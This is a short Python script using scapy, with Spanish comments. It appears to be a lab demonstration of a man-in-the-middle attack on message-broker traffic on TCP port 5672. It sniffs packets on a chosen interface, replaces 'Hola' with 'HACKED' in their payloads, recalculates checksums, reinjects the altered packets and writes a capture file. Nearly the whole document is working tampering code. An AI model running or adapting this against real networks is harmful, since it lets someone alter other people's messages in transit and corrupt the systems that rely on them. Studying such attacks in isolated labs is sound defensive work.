from scapy.all import sniff, sendp, wrpcap, get_if_list, Raw

OUTPUT = "/captures/trace_mitm.pcap"

interfaces = get_if_list()
print("Interfaces detectadas en este contenedor:", flush=True)
for i, iface in enumerate(interfaces):
    print(f"  [{i+1}] {iface}", flush=True)

input_str = input("\nElige la interfaz por nombre o número (ENTER para 'eth0'): ").strip()
if input_str == "":
    IFACE = "eth0"
elif input_str.isdigit() and 1 <= int(input_str) <= len(interfaces):
    IFACE = interfaces[int(input_str) - 1]
else:
    IFACE = input_str

FILTER = "tcp port 5672"
print(f"\nMITM sniffing on interface: {IFACE} | filter: {FILTER}\n", flush=True)

captured_packets = []
modificados = 0

def patch_and_resend(pkt):
    global modificados
    if pkt.haslayer(Raw) and b"Hola" in bytes(pkt[Raw].load):
        old_payload = pkt[Raw].load
        new_payload = old_payload.replace(b"Hola", b"HACKED")
        pkt[Raw].load = new_payload
        # Recalcula los checksums y longitudes
        if pkt.haslayer('IP'):
            del pkt['IP'].chksum
            del pkt['IP'].len
        if pkt.haslayer('TCP'):
            del pkt['TCP'].chksum
        print(f"[MODIFICADO] {pkt.summary()} Payload cambiado 'Hola' -> 'HACKED'", flush=True)
        sendp(pkt, iface=IFACE, verbose=False)
        modificados += 1
    else:
        print(pkt.summary(), flush=True)
    captured_packets.append(pkt)

sniff(filter=FILTER, iface=IFACE, prn=patch_and_resend, timeout=60)

wrpcap(OUTPUT, captured_packets)
print(f"\nGuardado {len(captured_packets)} paquetes en {OUTPUT}", flush=True)
print(f"Paquetes modificados y reenviados: {modificados}", flush=True)
